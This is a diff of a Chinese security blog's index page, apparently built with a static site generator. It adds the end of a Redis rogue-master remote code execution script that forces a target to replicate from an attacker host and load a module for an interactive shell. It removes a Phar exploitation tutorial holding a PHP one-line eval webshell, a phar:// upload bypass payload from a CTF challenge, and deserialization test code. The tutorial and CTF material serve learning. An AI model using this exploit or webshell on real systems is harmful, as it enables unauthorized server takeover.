+<p>if <strong>name</strong>==”<strong>main</strong>“:<br>    lhost=”192.168.163.132”<br>    lport=6666<br>    rhost=”192.168.163.128”<br>    rport=6379<br>    passwd=””<br>    redis_sock=redis_connect(rhost,rport)<br>    if passwd:<br>        send(redis_sock,”AUTH {}”.format(passwd))<br>    send(redis_sock,”SLAVEOF {} {}”.format(lhost,lport))<br>    send(redis_sock,”config set dbfilename {}”.format(exp_filename))<br>    time.sleep(2)<br>    RogueServer(lport)<br>    send(redis_sock,”MODULE LOAD ./{}”.format(exp_filename))<br>    interact_shell(redis_sock)<br><code>`</code></p>
+<p>效果图</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712154011-4783cdd2-a478-1.png" alt="image.png"></p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://redis.io/topics/protocol" title="https://redis.io/topics/protocol" target="_blank" rel="noopener">https://redis.io/topics/protocol</a><br><a href="https://www.cnblogs.com/kismetv/p/9236731.html#t1" title="https://www.cnblogs.com/kismetv/p/9236731.html#t1" target="_blank" rel="noopener">https://www.cnblogs.com/kismetv/p/9236731.html#t1</a><br><a href="http://duqingfeng.net/2018/06/08/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E2%80%94%E2%80%94%E5%85%A8%E9%87%8F%E5%A4%8D%E5%88%B6%E4%B8%8E%E5%A2%9E%E9%87%8F%E5%A4%8D%E5%88%B6%E6%80%BB%E7%BB%93/" title="http://duqingfeng.net/2018/06/08/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E2%80%94%E2%80%94%E5%85%A8%E9%87%8F%E5%A4%8D%E5%88%B6%E4%B8%8E%E5%A2%9E%E9%87%8F%E5%A4%8D%E5%88%B6%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://duqingfeng.net/2018/06/08/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E2%80%94%E2%80%94%E5%85%A8%E9%87%8F%E5%A4%8D%E5%88%B6%E4%B8%8E%E5%A2%9E%E9%87%8F%E5%A4%8D%E5%88%B6%E6%80%BB%E7%BB%93/</a><br><a href="https://www.cnblogs.com/hongmoshui/p/10594639.html" title="https://www.cnblogs.com/hongmoshui/p/10594639.html" target="_blank" rel="noopener">https://www.cnblogs.com/hongmoshui/p/10594639.html</a><br><a href="https://xz.aliyun.com/t/5616" title="https://xz.aliyun.com/t/5616" target="_blank" rel="noopener">https://xz.aliyun.com/t/5616</a><br><a href="https://joychou.org/web/hackredis-enhanced-edition-script.html" title="https://joychou.org/web/hackredis-enhanced-edition-script.html" target="_blank" rel="noopener">https://joychou.org/web/hackredis-enhanced-edition-script.html</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Redis</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">SSRF</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/07/15/浅析Redis中SSRF的利用/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-redis-rce分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/12/redis-rce分析/">redis-rce分析</a>
+    </h1>
+  
+
+        
+        <a href="/2019/07/12/redis-rce分析/" class="archive-article-date">
+  	<time datetime="2019-07-12T03:51:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/07/12/redis-rce分析/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-mysql中延时注入的5种姿势" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1245,258 +1483,10 @@
 
 
   
-    <article id="post-Phar的一些利用姿势" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/24/Phar的一些利用姿势/">Phar的一些利用姿势</a>
-    </h1>
-  
-
-        
-        <a href="/2018/12/24/Phar的一些利用姿势/" class="archive-article-date">
-  	<time datetime="2018-12-24T02:11:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-24</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>文章首发于先知社区 <a href="https://xz.aliyun.com/t/3692" target="_blank" rel="noopener">https://xz.aliyun.com/t/3692</a></p>
-</blockquote>
-<h1 id="Phar的简述"><a href="#Phar的简述" class="headerlink" title="Phar的简述"></a>Phar的简述</h1><p>翻译自手册：<br>phar是什么? Phar归档最好的特点是可以方便地将多个文件组合成一个文件。因此，phar归档提供了一种方法，可以将完整的PHP应用程序分发到单个文件中，并从该文件运行它，而不需要将其提取到磁盘。此外，PHP可以像执行任何其他文件一样轻松地执行phar归档，无论是在命令行上还是在web服务器上。</p>
-<h1 id="利用姿势一：绕过上传限制"><a href="#利用姿势一：绕过上传限制" class="headerlink" title="利用姿势一：绕过上传限制"></a>利用姿势一：绕过上传限制</h1><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>使用<code>Phar://</code>伪协议流可以Bypass一些上传的waf，大多数情况下和文件包含一起使用，就类似于我们的压缩包（其实就是一个压缩包），只不过我们换了一种方式去执行而已<br>写一段小代码测试一下：<br>test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">"cmd"</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>然后将test.php压缩，将压缩文件改后缀为<code>.jpg</code><br>index.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'phar://./test.jpg/test.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>成功包含</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181222135923-bb50ed6c-05ae-1.png" alt="image.png"></p>
-<h2 id="例题：安恒11月月赛：image-up"><a href="#例题：安恒11月月赛：image-up" class="headerlink" title="例题：安恒11月月赛：image_up"></a>例题：安恒11月月赛：image_up</h2><h3 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h3><p><a href="http://101.71.29.5:10043/index.php?page=login" target="_blank" rel="noopener">http://101.71.29.5:10043/index.php?page=login</a><br>尝试伪协议读取一波源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//101.71.29.5:10007/index.php?page=php://filter/read=convert.base64-encode/resource=</span></span><br></pre></td></tr></table></figure></p>
-<p>base64解码<br>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!stristr($_GET[<span class="string">'page'</span>],<span class="string">".."</span>))&#123;</span><br><span class="line">      $page = $_GET[<span class="string">'page'</span>].<span class="string">".php"</span>;</span><br><span class="line">      <span class="keyword">include</span>($page);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      header(<span class="string">"Location: index.php?page=login"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: index.php?page=login"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
-<p>login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    header(<span class="string">"Location: index.php?page=upload"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>upload.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $error = <span class="string">""</span>;</span><br><span class="line">    $exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"png"</span>,<span class="string">"gif"</span>,<span class="string">"jpeg"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"image"</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"image"</span>][<span class="string">"name"</span>]);</span><br><span class="line">        $extension = end($temp);</span><br><span class="line">        <span class="keyword">if</span>((@$_upfileS[<span class="string">"image"</span>][<span class="string">"size"</span>] &lt; <span class="number">102400</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(in_array($extension,$exts))&#123;</span><br><span class="line">              $path = <span class="string">"uploads/"</span>.md5($temp[<span class="number">0</span>].time()).<span class="string">"."</span>.$extension;</span><br><span class="line">              move_uploaded_file($_FILES[<span class="string">"image"</span>][<span class="string">"tmp_name"</span>], $path);</span><br><span class="line">              $error = <span class="string">"上传成功!"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $error = <span class="string">"上传失败！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          $error = <span class="string">"文件过大，上传失败！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>从upload.php可以看出只能上传（”jpg”,”png”,”gif”,”jpeg”）文件，而且再index.php中在包含的文件后面强行加了”.php”,直接包含图片文件明显不可以了，于是就用到了我们的Phar伪协议流，将我们的一句话木马打包成压缩包，然后再将后缀改为<code>.jpg</code>,这样就能通过Phar伪协议去包含我们的一句话木马了。<br>这题有一个坑点，就是时间戳的问题：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path = <span class="string">"uploads/"</span>.md5($temp[<span class="number">0</span>].time()).<span class="string">"."</span>.$extension;</span><br></pre></td></tr></table></figure></p>
-<p>这里要<code>time()+8*3600</code>，时区不同所以要加上8小时</p>
-<p>payload：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?page=phar:<span class="comment">//./uploads/6b19a5399b7d34fbb3c509ca8c25fd89.jpg/1</span></span><br></pre></td></tr></table></figure></p>
-<p>菜刀连接即可getflag<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181222130629-57346c8e-05a7-1.png" alt="image.png"></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181222130646-613ae366-05a7-1.png" alt="image.png"></p>
-<h1 id="利用姿势二：Phar反序列化漏洞"><a href="#利用姿势二：Phar反序列化漏洞" class="headerlink" title="利用姿势二：Phar反序列化漏洞"></a>利用姿势二：Phar反序列化漏洞</h1><p>我们一般利用反序列漏洞，一般都是借助<code>unserialize()</code>函数，不过随着人们安全的意识的提高这种漏洞利用越来越来难了，但是在今年8月份的<code>Blackhat2018</code>大会上，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用<code>unserialize()</code>函数的情况下触发PHP反序列化漏洞。漏洞触发是利用<code>Phar://</code> 伪协议读取phar文件时，会反序列化<code>meta-data</code>储存的信息。</p>
-<h2 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a>Phar文件结构</h2><p>Phar文件主要包含三至四个部分：</p>
-<h3 id="1-A-stub"><a href="#1-A-stub" class="headerlink" title="1. A stub"></a>1. A stub</h3><p>stub的基本结构：<code>&lt;?php __HALT_COMPILER();</code>，stub必须以<code>__HALT_COMPILER()</code>;来作为结束部分，否则Phar拓展将不会识别该文件。</p>
-<h3 id="2-a-manifest-describing-the-contents"><a href="#2-a-manifest-describing-the-contents" class="headerlink" title="2. a manifest describing the contents"></a>2. a manifest describing the contents</h3><p>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以反序列化的形式储存，这里就是漏洞利用的关键点<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221212526-e0bed25c-0523-1.png" alt="image.png"></p>
-<h3 id="3-the-file-contents"><a href="#3-the-file-contents" class="headerlink" title="3. the file contents"></a>3. the file contents</h3><p>被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化</p>
-<h3 id="4-a-signature-for-verifying-Phar-integrity"><a href="#4-a-signature-for-verifying-Phar-integrity" class="headerlink" title="4. a signature for verifying Phar integrity"></a>4. a signature for verifying Phar integrity</h3><p>签名格式<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221211646-aada296c-0522-1.png" alt="image.png"></p>
-<h3 id="小测试"><a href="#小测试" class="headerlink" title="小测试"></a>小测试</h3><p>既然都知道Phar文件的基本结构了，那么我们就写一段代码来测试一下<br>PS：php.ini中必须设置phar.readonly=Off，不然Phar文件就会无法生成。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $test=<span class="string">"test"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(<span class="string">"test.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> Test();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    $phar-&gt;stopBuffering();    <span class="comment">//签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>查看一下phar文件的结构，可以看到Meta-data的内容是以反序列的形式储存的。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221215206-9a88aaa2-0527-1.png" alt="image.png"></p>
-<p>那序列化部分的内容怎么反序列呢？<br>在使用Phar:// 协议流解析Phar文件时，Meta-data中的内容都会进行反序列化<br><strong>小trick：系统文件操作的函数一般都能使用伪协议流，Phar:// 也是ok的</strong><br>写一段小代码测试一下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"test"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_get_contents(<span class="string">"phar://./test.phar/test.txt"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>可以看到成功触发了反序列化</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221220844-ed0aef9a-0529-1.png" alt="image.png"></p>
-<h2 id="实战运用"><a href="#实战运用" class="headerlink" title="实战运用"></a>实战运用</h2><p>一般情况下，利用Phar反序列漏洞有几个条件：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以上传Phar文件</span><br><span class="line">有可以利用的魔术方法</span><br><span class="line">文件操作函数的参数可控</span><br></pre></td></tr></table></figure></p>
-<h2 id="例题：SWPUCTF2018-SimplePHP"><a href="#例题：SWPUCTF2018-SimplePHP" class="headerlink" title="例题：SWPUCTF2018 SimplePHP"></a>例题：SWPUCTF2018 SimplePHP</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>这题有两个功能：1.查看文件。2.上传文件<br>按流程走一下，先查看一波源码<br><code>file.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html/'</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$show = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123;</span><br><span class="line">    $show-&gt;source = $file;</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><code>upload_file.php</code>：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line">upload_file();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><code>function.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"base.php"</span>;</span><br><span class="line">header(<span class="string">"Content-type: text/html;charset=utf-8"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $_FILES;</span><br><span class="line">    $filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">".jpg"</span>;</span><br><span class="line">    <span class="comment">//mkdir("upload",0777);</span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"upload/"</span> . $filename)) &#123;</span><br><span class="line">        unlink($filename);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span> . $filename);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $_FILES;</span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123;</span><br><span class="line">        upload_file_do();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $_FILES;</span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"jpeg"</span>,<span class="string">"jpg"</span>,<span class="string">"png"</span>);</span><br><span class="line">    $temp = explode(<span class="string">"."</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    $extension = end($temp);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123;</span><br><span class="line">        <span class="comment">//echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;";</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><code>class.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span 